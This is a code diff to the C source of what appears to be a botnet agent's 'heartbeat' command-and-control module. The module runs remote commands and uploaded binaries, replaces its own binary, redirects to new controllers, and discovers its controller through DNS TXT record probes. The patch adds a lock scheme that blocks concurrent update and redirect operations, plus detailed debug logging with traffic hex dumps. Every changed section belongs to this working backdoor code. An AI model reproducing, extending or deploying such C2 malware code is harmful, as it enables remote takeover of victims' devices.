@@ -9,6 +9,7 @@
 
 #include <string.h>
 #include <errno.h>
+#include <inttypes.h>
 
 #include <fcntl.h>
 #include <poll.h>
@@ -17,6 +18,7 @@
 #include <sys/ioctl.h>
 
 #include <mbedtls/base64.h>
+
 
 // Hover Max Redirection count
 #define HTBT_HOVER_MAX_REDIR	5
@@ -43,6 +45,17 @@ static const struct timespec HTBT_RELAY_CHILD_TIMEOUT = { 60, 0 }; // 60s
 // Download tick timeout
 static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s
 
+
+#define HTBT_NT_MAIN "htbt_main"
+#define HTBT_NT_LBD "htbt_lbd"
+#define HTBT_NT_CNCP "htbt_cncp"
+#define HTBT_NT_SLV "htbt_slv"
+
+typedef uint_fast8_t htbt_lmk_t;
+#define HTBT_LMK_NONE		0
+#define HTBT_LMK_HOVER		1
+#define HTBT_LMK_NYBIN		2
+
 typedef struct {
 	int fd[2];
 	void *ioctx;
@@ -56,6 +69,8 @@ typedef struct {
 		const prne_htbt_hover_t *hv,
 		prne_htbt_status_code_t *status,
 		int32_t *err);
+	bool (*lm_acquire_f)(void *ioctx, const htbt_lmk_t v);
+	void (*lm_release_f)(void *ioctx, const htbt_lmk_t v);
 	const prne_htbt_cbset_t *cbset;
 	void *cb_ctx;
 	size_t skip;
@@ -105,6 +120,10 @@ struct prne_htbt {
 	pth_mutex_t lock;
 	pth_cond_t cond;
 	bool loop_flag;
+	struct { // Lock Matrix
+		pth_mutex_t lock;
+		htbt_lmk_t m;
+	} lock_m;
 	struct { // Main
 		// Request queue for HOVER
 		prne_llist_t req_q;
@@ -147,6 +166,28 @@ static void htbt_mv_req_slip (htbt_req_slip_t *a, htbt_req_slip_t *b) {
 	htbt_free_req_slip(b);
 	memcpy(b, a, sizeof(htbt_req_slip_t));
 	prne_memzero(a, sizeof(htbt_req_slip_t));
+}
+
+static bool htbt_lm_acquire (prne_htbt_t *ctx, const htbt_lmk_t v) {
+	bool ret;
+
+	prne_dbgtrap(pth_mutex_acquire(&ctx->lock_m.lock, FALSE, NULL));
+	if ((ctx->lock_m.m & v) == 0) {
+		ctx->lock_m.m |= v;
+		ret = true;
+	}
+	else {
+		ret = false;
+	}
+	pth_mutex_release(&ctx->lock_m.lock);
+
+	return ret;
+}
+
+static void htbt_lm_release (prne_htbt_t *ctx, const htbt_lmk_t v) {
+	prne_dbgtrap(pth_mutex_acquire(&ctx->lock_m.lock, FALSE, NULL));
+	ctx->lock_m.m &= ~v;
+	pth_mutex_release(&ctx->lock_m.lock);
 }
 
 static bool htbt_main_q_req_slip (prne_htbt_t *ctx, htbt_req_slip_t *in) {
@@ -205,11 +246,20 @@ static bool htbt_main_q_hover (
 	prne_llist_entry_t *trace)
 {
 	bool ret = false;
+	htbt_lmk_t lmk = HTBT_LMK_NONE;
 	htbt_req_slip_t slip;
 	htbt_hv_req_body_t *body;
 	prne_llist_entry_t *ny_trace = NULL;
 
 	htbt_init_req_slip(&slip);
+
+	if (htbt_lm_acquire(ctx, HTBT_LMK_HOVER)) {
+		lmk = HTBT_LMK_HOVER;
+	}
+	else {
+		errno = EBUSY;
+		goto END;
+	}
 
 	slip.free_f = (prne_htbt_free_ft)htbt_free_hv_req_body;
 	slip.op = PRNE_HTBT_OP_HOVER;
@@ -247,6 +297,9 @@ END:
 		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		prne_llist_erase(&ctx->main.hover_req, ny_trace);
 		pth_mutex_release(&ctx->main.lock);
+	}
+	if (!ret && lmk != HTBT_LMK_NONE) {
+		htbt_lm_release(ctx, lmk);
 	}
 	htbt_free_req_slip(&slip);
 	return ret;
@@ -708,21 +761,11 @@ END:
 }
 
 static void htbt_init_slv_ctx (htbt_slv_ctx_t *ctx) {
+	prne_memzero(ctx, sizeof(htbt_slv_ctx_t));
 	ctx->fd[0] = -1;
 	ctx->fd[1] = -1;
 	prne_init_iobuf(ctx->iobuf + 0);
 	prne_init_iobuf(ctx->iobuf + 1);
-	ctx->ioctx = NULL;
-	ctx->loopchk_f = NULL;
-	ctx->setup_f = NULL;
-	ctx->cleanup_f = NULL;
-	ctx->write_f = NULL;
-	ctx->read_f = NULL;
-	ctx->cbset = NULL;
-	ctx->cv.broadcast = false;
-	ctx->cv.lock = NULL;
-	ctx->cv.cond = NULL;
-	ctx->skip = 0;
 	ctx->valid = true;
 }
 
@@ -783,8 +826,41 @@ static void htbt_slv_consume_outbuf (
 				ctx->iobuf[1].m,
 				ctx->iobuf[1].len);
 			if (fret <= 0) {
+				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+					if (fret == 0) {
+						prne_dbgpf(
+							HTBT_NT_SLV"@%"PRIuPTR": write EOF.\n",
+							(uintptr_t)ctx);
+					}
+					else {
+						prne_dbgpf(
+							HTBT_NT_SLV"@%"PRIuPTR": write error: "
+							"ret=%d, errno=%d\n",
+							(uintptr_t)ctx,
+							fret,
+							errno);
+					}
+				}
 				ctx->valid = false;
 				break;
+			}
+			if (PRNE_DEBUG) {
+				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+					prne_dbgpf(
+						HTBT_NT_SLV"@%"PRIuPTR": > %d bytes: ",
+						(uintptr_t)ctx,
+						fret);
+					for (int i = 0; i < fret; i += 1) {
+						prne_dbgpf("%02"PRIx8" ", ctx->iobuf[1].m[i]);
+					}
+					prne_dbgpf("\n");
+				}
+				else {
+					prne_dbgpf(
+						HTBT_NT_SLV"@%"PRIuPTR": > %d bytes.\n",
+						(uintptr_t)ctx,
+						fret);
+				}
 			}
 			prne_iobuf_shift(ctx->iobuf + 1, -fret);
 		}
@@ -817,6 +893,18 @@ static void htbt_slv_fab_frame (
 
 	prne_assert(req <= ctx->iobuf[1].size);
 	htbt_slv_consume_outbuf(ctx, req, ev);
+
+	if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
+#if PRNE_DEBUG
+		const char *opstr = prne_htbt_op_tostr(mh->op);
+#endif
+		prne_dbgpf(
+			HTBT_NT_SLV"@%"PRIuPTR": > %"PRIu16" %s(%d)\n",
+			(uintptr_t)ctx,
+			mh->id,
+			opstr != NULL ? opstr : "?",
+			mh->op);
+	}
 
 	prne_htbt_ser_msg_head(
 		ctx->iobuf[1].m + ctx->iobuf[1].len,
@@ -1044,6 +1132,7 @@ static bool htbt_slv_srv_bin (
 	pth_event_t ev = NULL;
 	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
 	int32_t ret_errno = 0;
+	htbt_lmk_t lmk = HTBT_LMK_NONE;
 
 	prne_dbgast(
 		mh->op == PRNE_HTBT_OP_RUN_BIN ||
@@ -1071,9 +1160,21 @@ static bool htbt_slv_srv_bin (
 	}
 
 	if (ctx->cbset->tmpfile == NULL ||
-		(mh->op == PRNE_HTBT_OP_NY_BIN && ctx->cbset->ny_bin == NULL)) {
+		(mh->op == PRNE_HTBT_OP_NY_BIN && ctx->cbset->ny_bin == NULL))
+	{
 		ret_status = PRNE_HTBT_STATUS_UNIMPL;
 		goto SND_STATUS;
+	}
+
+	if (mh->op == PRNE_HTBT_OP_NY_BIN && ctx->lm_acquire_f != NULL) {
+		if (ctx->lm_acquire_f(ctx->ioctx, HTBT_LMK_NYBIN)) {
+			lmk = HTBT_LMK_NYBIN;
+		}
+		else {
+			ret_status = PRNE_HTBT_STATUS_ERRNO;
+			ret_errno = EBUSY;
+			goto SND_STATUS;
+		}
 	}
 
 	errno = 0;
@@ -1196,6 +1297,9 @@ END:
 	prne_free(args);
 	prne_close(fd);
 	pth_event_free(ev, FALSE);
+	if (lmk != HTBT_LMK_NONE && ctx->lm_release_f != NULL) {
+		ctx->lm_release_f(ctx->ioctx, lmk);
+	}
 
 	return ret;
 }
@@ -1276,9 +1380,9 @@ static bool htbt_slv_consume_inbuf (
 	prne_htbt_ser_rc_t s_ret;
 	prne_htbt_msg_head_t f_head;
 	size_t actual;
-	bool ret = true;
+	bool ret = false;
 
-	while (ret && ctx->valid) {
+	while (ctx->valid) {
 		htbt_slv_skip_inbuf(ctx);
 
 		prne_htbt_free_msg_head(&f_head);
@@ -1290,7 +1394,6 @@ static bool htbt_slv_consume_inbuf (
 			&actual,
 			&f_head);
 		if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-			ret = false;
 			break;
 		}
 		if (s_ret != PRNE_HTBT_SER_RC_OK ||
@@ -1301,26 +1404,38 @@ static bool htbt_slv_consume_inbuf (
 			goto END;
 		}
 
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+#if PRNE_DEBUG
+			const char *opstr = prne_htbt_op_tostr(f_head.op);
+#endif
+			prne_dbgpf(
+				HTBT_NT_SLV"@%"PRIuPTR": < %"PRIu16" %s(%d)\n",
+				(uintptr_t)ctx,
+				f_head.id,
+				opstr != NULL ? opstr : "?",
+				f_head.op);
+		}
 		f_head.is_rsp = true;
 		switch (f_head.op) {
 		case PRNE_HTBT_OP_NOOP:
 			prne_iobuf_shift(ctx->iobuf + 0, -actual);
 			break;
 		case PRNE_HTBT_OP_STDIO:
-			ret = htbt_slv_srv_stdio(ctx, root_ev, actual, &f_head);
+			ret |= htbt_slv_srv_stdio(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_HOST_INFO:
 			htbt_slv_srv_hostinfo(ctx, root_ev, actual, &f_head);
+			ret |= true;
 			break;
 		case PRNE_HTBT_OP_RUN_CMD:
-			ret = htbt_slv_srv_run_cmd(ctx, root_ev, actual, &f_head);
+			ret |= htbt_slv_srv_run_cmd(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_RUN_BIN:
 		case PRNE_HTBT_OP_NY_BIN:
-			ret = htbt_slv_srv_bin(ctx, root_ev, actual, &f_head);
+			ret |= htbt_slv_srv_bin(ctx, root_ev, actual, &f_head);
 			break;
 		case PRNE_HTBT_OP_HOVER:
-			ret = htbt_slv_srv_hover(ctx, root_ev, actual, &f_head);
+			ret |= htbt_slv_srv_hover(ctx, root_ev, actual, &f_head);
 			break;
 		default:
 			htbt_slv_raise_protoerr(ctx, f_head.id, PRNE_HTBT_STATUS_UNIMPL);
@@ -1339,6 +1454,10 @@ static void *htbt_slv_entry (void *p) {
 	int f_ret;
 	pth_event_t ev_timeout, ev_root = NULL;
 	struct pollfd pfd[2];
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(HTBT_NT_SLV"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
+	}
 
 	ev_timeout = pth_event(
 		PTH_EVENT_TIME,
@@ -1410,8 +1529,43 @@ static void *htbt_slv_entry (void *p) {
 					ctx->iobuf[0].m + ctx->iobuf[0].len,
 					ctx->iobuf[0].avail);
 				if (f_ret <= 0) {
+					if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+						if (f_ret == 0) {
+							prne_dbgpf(
+								HTBT_NT_SLV"@%"PRIuPTR": read EOF.\n",
+								(uintptr_t)ctx);
+						}
+						else {
+							prne_dbgpf(
+								HTBT_NT_SLV"@%"PRIuPTR": read error: "
+								"ret=%d, errno=%d\n",
+								(uintptr_t)ctx,
+								f_ret,
+								errno);
+						}
+					}
 					ctx->valid = false;
 					break;
+				}
+				if (PRNE_DEBUG) {
+					if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+						prne_dbgpf(
+							HTBT_NT_SLV"@%"PRIuPTR": < %d bytes: ",
+							(uintptr_t)ctx,
+							f_ret);
+						for (int i = 0; i < f_ret; i += 1) {
+							prne_dbgpf(
+								"%02"PRIx8" ",
+								ctx->iobuf[0].m[ctx->iobuf[0].len + i]);
+						}
+						prne_dbgpf("\n");
+					}
+					else {
+						prne_dbgpf(
+							HTBT_NT_SLV"@%"PRIuPTR": < %d bytes.\n",
+							(uintptr_t)ctx,
+							f_ret);
+					}
 				}
 				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
 
@@ -1435,6 +1589,10 @@ END:
 
 	pth_event_free(ev_root, FALSE);
 	pth_event_free(ev_timeout, FALSE);
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(HTBT_NT_SLV"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
+	}
 
 	ctx->valid = false;
 	return NULL;
@@ -1617,6 +1775,16 @@ static ssize_t htbt_main_slv_write_f (
 	return mbedtls_ssl_write(&ctx->ssl, (const unsigned char*)buf, len);
 }
 
+static bool htbt_main_slv_lm_acq_f (void *ioctx, const htbt_lmk_t v) {
+	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
+	return htbt_lm_acquire(ctx->parent, v);
+}
+
+static void htbt_main_slv_lm_rel_f (void *ioctx, const htbt_lmk_t v) {
+	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
+	htbt_lm_release(ctx->parent, v);
+}
+
 static void htbt_main_slv_hover_f (
 	void *ioctx,
 	const prne_htbt_hover_t *hv,
@@ -1663,6 +1831,8 @@ static void htbt_main_srv_hover (
 	c.slv.read_f = htbt_main_slv_read_f;
 	c.slv.write_f = htbt_main_slv_write_f;
 	c.slv.hover_f = htbt_main_slv_hover_f;
+	c.slv.lm_acquire_f = htbt_main_slv_lm_acq_f;
+	c.slv.lm_release_f = htbt_main_slv_lm_rel_f;
 	c.slv.cbset = &ctx->param.cb_f;
 	c.slv.cb_ctx = ctx->param.cb_ctx;
 	c.slv.cv.lock = &ctx->lock;
@@ -1674,9 +1844,11 @@ static void htbt_main_srv_hover (
 
 // TRY
 	if (!htbt_alloc_slv_iobuf(&c.slv)) {
+		prne_dbgperr("htbt_alloc_slv_iobuf()");
 		goto END;
 	}
 	if (mbedtls_ssl_setup(&c.ssl, ctx->param.main_ssl_conf) != 0) {
+		prne_dbgperr("mbedtls_ssl_setup()");
 		goto END;
 	}
 	mbedtls_ssl_set_bio(
@@ -1688,10 +1860,17 @@ static void htbt_main_srv_hover (
 
 	c.fd = htbt_main_do_connect(ctx, &body->msg);
 	if (c.fd < 0) {
+		prne_dbgperr("htbt_main_do_connect()");
 		goto END;
 	}
 	c.slv.fd[0] = c.slv.fd[1] = c.fd;
 
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_MAIN"@%"PRIuPTR": starting slv@%"PRIuPTR"\n",
+			(uintptr_t)ctx,
+			(uintptr_t)&c.slv);
+	}
 	htbt_slv_entry(&c.slv);
 
 	if (!c.hv_used) {
@@ -1710,6 +1889,10 @@ static void *htbt_main_entry (void *p) {
 	HTBT_INTP_CTX(p);
 	htbt_req_slip_t *slip = NULL;
 
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(HTBT_NT_MAIN"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
+	}
+
 	if (ctx->lbd.pth != NULL) {
 		pth_resume(ctx->lbd.pth);
 	}
@@ -1717,6 +1900,11 @@ static void *htbt_main_entry (void *p) {
 		pth_resume(ctx->cncp.pth);
 	}
 
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_MAIN"@%"PRIuPTR": loop start.\n",
+			(uintptr_t)ctx);
+	}
 	while (ctx->loop_flag) {
 		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
 		if (ctx->main.req_q.head == NULL) {
@@ -1735,11 +1923,30 @@ static void *htbt_main_entry (void *p) {
 			continue;
 		}
 
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+#if PRNE_DEBUG
+			const char *op_str = prne_htbt_op_tostr(slip->op);
+#endif
+			prne_dbgpf(
+				HTBT_NT_MAIN"@%"PRIuPTR": received req_slip@%"PRIuPTR" - %s.\n",
+				(uintptr_t)ctx,
+				(uintptr_t)slip,
+				op_str != NULL ? op_str : "?");
+		}
 		switch (slip->op) {
 		case PRNE_HTBT_OP_HOVER:
 			htbt_main_srv_hover(ctx, (htbt_hv_req_body_t*)slip->body);
+			htbt_lm_release(ctx, HTBT_LMK_HOVER);
 			break;
-		default: prne_dbgpf("* Unimpl OP in main: %d\n", slip->op);
+		default:
+			if (PRNE_DEBUG) {
+				prne_dbgpf(
+					HTBT_NT_MAIN"@%"PRIuPTR": unimplemented op %d of "
+					"req_slip@%"PRIuPTR".\n",
+					(uintptr_t)ctx,
+					slip->op,
+					(uintptr_t)slip);
+			}
 		}
 
 FREE:
@@ -1749,6 +1956,11 @@ FREE:
 			prne_free(slip);
 			slip = NULL;
 		}
+	}
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_MAIN"@%"PRIuPTR": loop end.\n",
+			(uintptr_t)ctx);
 	}
 
 	if (ctx->lbd.pth != NULL) {
@@ -1764,6 +1976,9 @@ FREE:
 	prne_llist_clear(&ctx->main.hover_req);
 	prne_close(ctx->lbd.fd);
 	ctx->lbd.fd = -1;
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(HTBT_NT_MAIN"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
+	}
 
 	return NULL;
 }
@@ -1809,6 +2024,16 @@ static ssize_t htbt_cncp_slv_write_f (
 	const size_t len)
 {
 	return len;
+}
+
+static bool htbt_cncp_slv_lm_acq_f (void *ioctx, const htbt_lmk_t v) {
+	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
+	return htbt_lm_acquire(ctx->parent, v);
+}
+
+static void htbt_cncp_slv_lm_rel_f (void *ioctx, const htbt_lmk_t v) {
+	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
+	htbt_lm_release(ctx->parent, v);
 }
 
 static void htbt_cncp_slv_hover_f (
@@ -1871,6 +2096,8 @@ static void htbt_cncp_stream_slv (
 	c.slv.read_f = htbt_cncp_slv_read_f;
 	c.slv.write_f = htbt_cncp_slv_write_f;
 	c.slv.hover_f = htbt_cncp_slv_hover_f;
+	c.slv.lm_acquire_f = htbt_cncp_slv_lm_acq_f;
+	c.slv.lm_release_f = htbt_cncp_slv_lm_rel_f;
 	c.slv.cbset = &ctx->param.cb_f;
 	c.slv.cb_ctx = ctx->param.cb_ctx;
 	if (!htbt_alloc_slv_iobuf(&c.slv)) {
@@ -1879,6 +2106,13 @@ static void htbt_cncp_stream_slv (
 	}
 	c.slv.cv.lock = &ctx->lock;
 	c.slv.cv.cond = &ctx->cond;
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(
+			HTBT_NT_CNCP"@%"PRIuPTR": starting slv@%"PRIuPTR"\n",
+			(uintptr_t)ctx,
+			(uintptr_t)&c.slv);
+	}
 
 	c.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_slv_entry, &c.slv);
 	if (c.pth == NULL) {
@@ -1934,6 +2168,26 @@ static void htbt_cncp_stream_slv (
 			if (f_ret < 0) {
 				prne_dbgpf("* mbedtls_base64_decode()@CNCP: %d\n", f_ret);
 				goto END;
+			}
+			if (PRNE_DEBUG) {
+				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
+					prne_dbgpf(
+						HTBT_NT_CNCP"@%"PRIuPTR": < %zu bytes: ",
+						(uintptr_t)ctx,
+						declen);
+					for (size_t i = 0; i < declen; i += 1) {
+						prne_dbgpf(
+							"%02"PRIx8" ",
+							trio.m[trio.len + i]);
+					}
+					prne_dbgpf("\n");
+				}
+				else {
+					prne_dbgpf(
+						HTBT_NT_CNCP"@%"PRIuPTR": < %zu bytes.\n",
+						(uintptr_t)ctx,
+						declen);
+				}
 			}
 			prne_iobuf_shift(&trio, declen);
 
@@ -2053,11 +2307,36 @@ static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
 			ctx->cncp.txtrec[8 + prefix_len] = 0;
 		}
 
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				HTBT_NT_CNCP"@%"PRIuPTR": got CNC TXT REC - "
+				"prefix=\"%s\", length=%"PRIu32"\n",
+				(uintptr_t)ctx,
+				ctx->cncp.txtrec + 8,
+				(uint32_t)prne_recmb_msb32(len[0], len[1], len[2], len[3]));
+		}
+
 		htbt_cncp_stream_slv(
 			ctx,
 			&prm,
 			&cv,
 			prne_recmb_msb32(len[0], len[1], len[2], len[3]));
+	}
+	else {
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+#if PRNE_DEBUG
+			const char *qrstr = prne_resolv_qr_tostr(prm.fut->qr);
+			const char *rcstr = prne_resolv_rcode_tostr(prm.fut->status);
+#endif
+			prne_dbgpf(
+				HTBT_NT_CNCP"@%"PRIuPTR": query failed - "
+				"code=%s, status=%s, err=%d\n",
+				(uintptr_t)ctx,
+				qrstr != NULL ? qrstr : "?",
+				rcstr != NULL ? rcstr : "?",
+				prm.fut->err);
+
+		}
 	}
 
 END:
@@ -2069,6 +2348,13 @@ static void *htbt_cncp_entry (void *p) {
 	HTBT_INTP_CTX(p);
 	unsigned long intvar;
 	pth_event_t ev = NULL;
+#if PRNE_DEBUG
+	struct timespec sleep_start, sleep_end;
+#endif
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(HTBT_NT_CNCP"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
+	}
 
 	while (ctx->loop_flag) {
 		htbt_cncp_do_probe(ctx);
@@ -2085,13 +2371,38 @@ static void *htbt_cncp_entry (void *p) {
 			PTH_EVENT_TIME,
 			prne_pth_tstimeout(prne_ms_timespec(intvar)));
 
+
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				HTBT_NT_CNCP"@%"PRIuPTR": sleeping %lums.\n",
+				(uintptr_t)ctx,
+				intvar);
+		}
+
 		// wait
+#if PRNE_DEBUG
+		sleep_start = prne_gettime(CLOCK_MONOTONIC);
+#endif
 		prne_assert(ev != NULL); // fatal without timeout
 		prne_dbgtrap(pth_mutex_acquire(&ctx->cncp.lock, FALSE, NULL));
 		if (ctx->loop_flag) {
 			pth_cond_await(&ctx->cncp.cond, &ctx->cncp.lock, ev);
 		}
 		pth_mutex_release(&ctx->cncp.lock);
+#if PRNE_DEBUG
+		sleep_end = prne_gettime(CLOCK_MONOTONIC);
+#endif
+
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+			prne_dbgpf(
+				HTBT_NT_CNCP"@%"PRIuPTR": slept %ldms.\n",
+				(uintptr_t)ctx,
+				prne_timespec_ms(prne_sub_timespec(sleep_end, sleep_start)));
+		}
+	}
+
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		prne_dbgpf(HTBT_NT_CNCP"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
 	}
 
 	pth_event_free(ev, FALSE);
@@ -2138,6 +2449,16 @@ static ssize_t htbt_lbd_slv_write_f (
 	return mbedtls_ssl_write(&ctx->ssl, (const unsigned char*)buf, len);
 }
 
+static bool htbt_lbd_slv_lm_acq_f (void *ioctx, const htbt_lmk_t v) {
+	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
+	return htbt_lm_acquire(ctx->parent, v);
+}
+
+static void htbt_lbd_slv_lm_rel_f (void *ioctx, const htbt_lmk_t v) {
+	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
+	htbt_lm_release(ctx->parent, v);
+}
+
 static void htbt_lbd_slv_hover_f (
 	void *ioctx,
 	const prne_htbt_hover_t *hv,
@@ -2182,6 +2503,8 @@ static bool htbt_alloc_lbd_client (
 	c->slv.read_f = htbt_lbd_slv_read_f;
 	c->slv.write_f = htbt_lbd_slv_write_f;
 	c->slv.hover_f = htbt_lbd_slv_hover_f;
+	c->slv.lm_acquire_f = htbt_lbd_slv_lm_acq_f;
+	c->slv.lm_release_f = htbt_lbd_slv_lm_rel_f;
 	c->slv.cbset = &parent->param.cb_f;
 	c->slv.cb_ctx = parent->param.cb_ctx;
 	c->slv.cv.lock = &parent->lock;
@@ -2489,9 +2812,10 @@ prne_htbt_t *prne_alloc_htbt (
 	prne_htbt_init_param(&ret->param);
 	prne_init_llist(&ret->main.req_q);
 	prne_init_llist(&ret->main.hover_req);
-	ret->loop_flag = true;
 	pth_mutex_init(&ret->lock);
 	pth_cond_init(&ret->cond);
+	ret->loop_flag = true;
+	pth_mutex_init(&ret->lock_m.lock);
 
 	pth_mutex_init(&ret->main.lock);
 	pth_cond_init(&ret->main.cond);
